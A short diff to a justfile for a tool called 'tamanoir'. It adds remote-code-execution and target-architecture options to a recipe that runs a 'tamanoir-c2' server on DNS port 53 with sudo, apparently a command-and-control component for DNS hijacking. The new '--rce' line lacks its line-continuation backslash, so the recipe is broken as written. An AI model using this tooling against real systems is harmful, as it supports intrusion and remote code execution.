@@ -27,8 +27,12 @@ run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
     RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}
 
 # Run the proxy
-proxy dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" :
-    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} --dns-ip {{dns_ip}} --payload-len {{payload_len}}
+proxy dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" rce="hello" target_arch="x86_64":
+    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} \
+    --dns-ip {{dns_ip}} \
+    --payload-len {{payload_len}}\
+    --rce {{rce}}
+    --target_arch {{target_arch}}
 
 _atoi ipv4_address:
 	#!/usr/bin/env bash
